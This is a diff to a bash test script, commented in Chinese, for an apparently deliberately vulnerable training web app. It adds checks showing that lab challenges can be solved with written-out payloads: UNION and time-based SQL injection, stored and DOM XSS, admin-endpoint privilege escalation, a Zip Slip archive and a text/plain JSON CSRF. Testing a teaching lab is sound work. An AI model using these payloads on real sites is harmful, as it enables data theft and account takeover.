@@ -42,6 +42,10 @@ check_solved() {
 expect_solved()   { if check_solved "$1"; then ok "$2"; else bad "$2（check() 说 $1 还没通关）"; fi; }
 expect_unsolved() { if check_solved "$1"; then bad "$2（check() 说 $1 已经通关了）"; else ok "$2"; fi; }
 
+# 比较浮点数（时间盲注那一题要用）
+expect_lt() { if awk "BEGIN{exit !($2 < $3)}"; then ok "$1（$2 秒）"; else bad "$1（$2 秒，期望小于 $3）"; fi; }
+expect_ge() { if awk "BEGIN{exit !($2 >= $3)}"; then ok "$1（$2 秒）"; else bad "$1（$2 秒，期望至少 $3）"; fi; }
+
 # 题目页里除了模块自己的内容，还嵌着两份 core 注入的文字：
 #   1. 「提示 / 答案」折叠区 —— 答案文本就在里面
 #   2. 「进度」区块 —— 目标名在里面
@@ -947,6 +951,181 @@ for item in hits[:5]:
 PY
 )
 expect_has "文档里没有内网地址 / 明文口令" "LEAK_COUNT=0" "$leak"
+
+step "13. 深度阶梯：同一分类下的第二、第三道题"
+
+# ---- sqli/union_query：没有报错回显，得靠 ORDER BY 数 + UNION 接表
+expect_unsolved "sqli/union_query" "动手之前 check() 说未通关"
+
+body=$(page -X POST "$BASE/v/sqli/union_query/" --data-urlencode "keyword=键盘")
+expect_has "正常搜索能出商品" "机械键盘" "$body"
+
+body=$(page -X POST "$BASE/v/sqli/union_query/" --data-urlencode "keyword=键盘' ORDER BY 4 -- ")
+expect_no "列数越界时结果为空" "机械键盘" "$body"
+expect_no "而且不回显数据库报错" "sqlite3" "$body"
+
+body=$(page -X POST "$BASE/v/sqli/union_query/" --data-urlencode "keyword=键盘' UNION SELECT 1,2,3 -- ")
+expect_has "列数对上之后语句又有效了" "机械键盘" "$body"
+expect_unsolved "sqli/union_query" "只找到显示位还不算通关（阶梯没塌）"
+
+body=$(page -X POST "$BASE/v/sqli/union_query/" \
+  --data-urlencode "keyword=键盘' UNION SELECT username, password, role FROM users -- ")
+expect_has "UNION 把 users 表接出来了" "S3cr3t-1nj3ct3d" "$body"
+expect_unsolved "sqli/union_query" "接出了数据但没提交密码，仍不算通关"
+
+curl -s -o /dev/null -X POST "$BASE/v/sqli/union_query/" --data-urlencode "guess=wrong1"
+expect_unsolved "sqli/union_query" "密码填错不算通关"
+
+curl -s -o /dev/null -X POST "$BASE/v/sqli/union_query/" \
+  --data-urlencode "guess=S3cr3t-1nj3ct3d"
+expect_solved "sqli/union_query" "check() 确认两个目标都达成"
+
+# 密码表单的字段名是模板里的，光用 curl 直接 POST guess 验不到它接得对不对
+body=$(page "$BASE/v/sqli/union_query/")
+expect_has "页面上那个提交框的字段名对得上" 'name="guess"' "$body"
+
+# ---- sqli/time_blind：页面永远一样，只剩时间这一个信号
+expect_unsolved "sqli/time_blind" "动手之前 check() 说未通关"
+
+t_normal=$(curl -s -o /dev/null -w '%{time_total}' -X POST "$BASE/v/sqli/time_blind/" \
+  --data-urlencode "badge=A1001")
+t_slow=$(curl -s -o /dev/null -w '%{time_total}' -X POST "$BASE/v/sqli/time_blind/" \
+  --data-urlencode "badge=' OR sleep(2) -- ")
+expect_lt "普通查询很快返回" "$t_normal" "1.5"
+expect_ge "塞进 sleep(2) 之后明显变慢" "$t_slow" "2.5"
+
+# 单次 sleep() 参数封顶是不够的：SQLite 按行求值（3 行），payload 还能连着写好几个。
+# 这一题用的是"每次请求的总睡眠预算"，所以 3 × sleep(60) 也只该花预算那么多。
+t_bomb=$(curl -s -o /dev/null -w '%{time_total}' -X POST "$BASE/v/sqli/time_blind/" \
+  --data-urlencode "badge=' OR sleep(60) -- ")
+expect_lt "一个请求塞 sleep(60) 会被总预算截住" "$t_bomb" "20"
+
+body=$(page -X POST "$BASE/v/sqli/time_blind/" --data-urlencode "badge=' OR sleep(2) -- ")
+expect_has "页面本身永远说同一句话" "查询完成" "$body"
+
+code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/v/sqli/time_blind/" \
+  --data-urlencode "guess=wrong1")
+expect_code "提交一个错密码" "$code" "200"
+expect_unsolved "sqli/time_blind" "猜错密码不算通关（第二个目标还没达成）"
+
+curl -s -o /dev/null -X POST "$BASE/v/sqli/time_blind/" --data-urlencode "guess=k3y9f2"
+expect_solved "sqli/time_blind" "check() 确认两个目标都达成"
+
+# ---- xss/stored_guestbook：payload 存在服务器上，刷新还在
+expect_unsolved "xss/stored_guestbook" "动手之前 check() 说未通关"
+
+curl -s -o /dev/null -X POST "$BASE/v/xss/stored_guestbook/" \
+  --data-urlencode "author=测试" --data-urlencode "body=<img src=x onerror=alert(1)>"
+
+# 重新取一次页面，URL 里什么都不带
+body=$(page "$BASE/v/xss/stored_guestbook/")
+expect_has "payload 留在服务器上，刷新后照样渲染" "onerror=alert(1)" "$body"
+expect_solved "xss/stored_guestbook" "check() 确认存储型 XSS 通关"
+
+# ---- xss/dom_based：payload 不在响应体里
+expect_unsolved "xss/dom_based" "动手之前 check() 说未通关"
+
+body=$(page --get "$BASE/v/xss/dom_based/" \
+  --data-urlencode "name=<img src=x onerror=alert(1)>")
+expect_no "响应体里找不到 payload —— DOM 型就是这样" "onerror=alert(1)" "$body"
+expect_has "页面自己承认响应体里没有它" "没有" "$body"
+
+# reset 之后单独验 fragment 那条路：它不经过服务端，靠页面自己回报
+curl -s -o /dev/null -X POST "$BASE/__vuln4all/reset" \
+  --data-urlencode "id=xss/dom_based" --data-urlencode "next=/"
+expect_unsolved "xss/dom_based" "reset 之后回到未通关"
+
+# 回报地址**从页面里读**，不要硬编码：页面里的 JS 用的是 url_for()，
+# 前缀一旦算错，浏览器那边就是个静默 404，而硬编码的断言照样会绿。
+dom_page=$(page "$BASE/v/xss/dom_based/")
+hit=$(printf '%s' "$dom_page" | grep -oE 'fetch\("[^"]*"' | head -n1 | cut -d'"' -f2)
+if [ -n "$hit" ]; then
+  ok "从页面里读到了 fragment 回报地址（$hit）"
+else
+  bad "页面里找不到 fragment 回报地址 —— url_for 那条线断了"
+fi
+
+code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE$hit")
+expect_code "空 POST 会被回报端点拒掉" "$code" "400"
+expect_unsolved "xss/dom_based" "空 POST 不算通关"
+
+code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE$hit" \
+  -H "Content-Type: application/json" \
+  --data-raw '{"hash":"<img src=x onerror=alert(1)>"}')
+expect_code "带着 fragment 内容回报的通路可达" "$code" "200"
+expect_solved "xss/dom_based" "fragment（#...）那条路也算通关"
+
+# 再 reset 一次，用查询参数那条路走一遍
+curl -s -o /dev/null -X POST "$BASE/__vuln4all/reset" \
+  --data-urlencode "id=xss/dom_based" --data-urlencode "next=/"
+body=$(page --get "$BASE/v/xss/dom_based/" \
+  --data-urlencode "name=<img src=x onerror=alert(1)>")
+expect_solved "xss/dom_based" "?name= 那条路同样算通关"
+
+# ---- idor/admin_endpoint：垂直越权
+expect_unsolved "idor/admin_endpoint" "动手之前 check() 说未通关"
+
+code=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/v/idor/admin_endpoint/admin/export")
+expect_code "匿名访问管理接口会被踢回登录（302）" "$code" "302"
+
+curl -s -o /dev/null -c "$JAR" -X POST "$BASE/v/idor/admin_endpoint/login" \
+  --data-urlencode "user=bob" --data-urlencode "password=bob123"
+
+body=$(page -b "$JAR" "$BASE/v/idor/admin_endpoint/console")
+expect_has "控制台 HTML 里躺着管理员入口" "admin/export" "$body"
+expect_has "它只是被 display:none 藏起来了" "display:none" "$body"
+
+code=$(curl -s -o /tmp/v4a-idor.html -w '%{http_code}' -b "$JAR" \
+  "$BASE/v/idor/admin_endpoint/admin/export")
+expect_code "普通用户直接访问管理接口 —— 200" "$code" "200"
+expect_has "拿到了全员的薪资数据" "月薪" "$(strip_teaching < /tmp/v4a-idor.html)"
+expect_solved "idor/admin_endpoint" "check() 确认垂直越权通关"
+rm -f "$JAR" /tmp/v4a-idor.html
+
+# ---- upload/zip_slip：压缩包里的成员名被当成了路径
+python3 - <<'PY'
+import zipfile
+
+# 成员名可以完全由我们指定 —— 命令行 zip 工具会规范化掉，所以要手搓
+with zipfile.ZipFile("/tmp/v4a-evil.zip", "w") as archive:
+    archive.writestr(zipfile.ZipInfo("../运营公告/公告.txt"), "这条公告已经被改了")
+PY
+expect_unsolved "upload/zip_slip" "动手之前 check() 说未通关"
+
+body=$(page -X POST "$BASE/v/upload/zip_slip/" \
+  -F "package=@/tmp/v4a-evil.zip;type=application/zip")
+expect_has "解压结果里标出了越界的成员" "落到上传目录外面的" "$body"
+expect_solved "upload/zip_slip" "check() 确认 Zip Slip 通关"
+
+body=$(page "$BASE/v/upload/zip_slip/")
+expect_has "被保护的那条公告确实被覆盖了" "这条公告已经被改了" "$body"
+rm -f /tmp/v4a-evil.zip
+
+# ---- csrf/json_api：表单发不出 JSON，但可以"长得像 JSON"
+expect_unsolved "csrf/json_api" "动手之前 check() 说未通关"
+
+curl -s -o /dev/null -c "$JAR" -X POST "$BASE/v/csrf/json_api/login" \
+  --data-urlencode "user=bob" --data-urlencode "password=bob123"
+
+# 反向一步：不带 Referer 的请求会被接受，但那不是跨站请求伪造
+code=$(curl -s -o /dev/null -w '%{http_code}' -b "$JAR" -X POST \
+  -H "Content-Type: application/json" --data-raw '{"email":"silent@corp.example"}' \
+  "$BASE/v/csrf/json_api/api/email")
+expect_code "接口接受 JSON 请求" "$code" "200"
+expect_unsolved "csrf/json_api" "光用 curl（没有 Referer）不算 CSRF"
+
+# 真正的攻击形态：Content-Type 是 text/plain，请求体却长得像 JSON
+code=$(curl -s -o /dev/null -w '%{http_code}' -b "$JAR" -X POST \
+  -H "Content-Type: text/plain" \
+  -H "Referer: $BASE/evil-json/" \
+  --data-raw '{"email":"attacker@evil.example","ignore":"="}' \
+  "$BASE/v/csrf/json_api/api/email")
+expect_code "长得像 JSON 的 text/plain 请求被接受" "$code" "200"
+expect_solved "csrf/json_api" "check() 确认 JSON CSRF 通关"
+
+body=$(page -b "$JAR" "$BASE/v/csrf/json_api/profile")
+expect_has "邮箱确实被改成了攻击者的值" "attacker@evil.example" "$body"
+rm -f "$JAR"
 
 step "结果"
 printf '  通过 %d 项，失败 %d 项\n' "$PASS" "$FAIL"
